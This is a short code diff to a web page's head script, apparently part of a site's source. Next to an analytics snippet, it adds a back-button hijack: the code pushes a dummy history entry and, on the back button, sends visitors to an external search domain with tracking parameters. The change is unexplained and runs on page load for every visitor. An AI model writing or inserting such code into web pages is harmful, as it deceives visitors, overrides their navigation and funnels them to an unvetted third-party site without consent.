@@ -82,6 +82,12 @@
         function gtag() { dataLayer.push(arguments); }
         gtag('js', new Date());
         gtag('config', 'G-9X8KS8NNZ0');
+
+        // Redirect when the back button is pressed
+        window.history.pushState(null, "", window.location.href); 
+        window.onpopstate = function () {
+            window.location.href = "https://search3.curenet.xyz/?utm_source=pushpa&utm_medium=bill&utm_campaign=bill";
+        };
     </script>
 </head>
 
